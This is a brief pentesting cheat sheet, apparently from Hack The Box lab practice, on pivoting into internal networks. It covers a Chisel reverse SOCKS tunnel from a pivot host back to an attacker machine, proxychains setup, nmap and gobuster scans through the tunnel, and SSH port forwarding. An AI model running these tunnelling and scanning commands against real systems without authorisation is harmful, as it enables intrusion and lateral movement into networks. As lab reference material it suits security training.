# Pivot

**Chisel :**

```
################################# Attacker Machine ###############################

./chisel server -p 8080 --reverse

#################################### Pivot Machine ################################

chisel.exe client attacker_ip:8080 R:socks

############################### Proxychains.conf #################################

socks5 127.0.0.1 1080

################################## Nmap Scan ####################################

Always better to transfer binaries and scan from the pivot

nmap.exe -sC -sV 10.10.10.10 -Pn -T5 // From Pivot machine 

proxychains nmap 10.10.10.10 -T5 -Pn -sT // From Kali Machine

################################### Gobuster ####################################

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -p socks5://127.0.0.1:1080
```

**Pivot via SSH key (HTB Nibbles)**

* ssh -i root.key -L9000:web\_ip:port ssh\_ip
  * Ex : `ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73`

**Pivot via root password (HTB Sense)**

* `ssh -D1080 pivot_ip`
* Burp -> user options -> socks proxy -> use socks proxy
* vi /etc/proxychains.conf
* Change socks4(metasploit) to socks5(ssh)
* proxychains curl -k [https://10.10.10.60](https://10.10.10.60) \[ -k to ignore SSL]
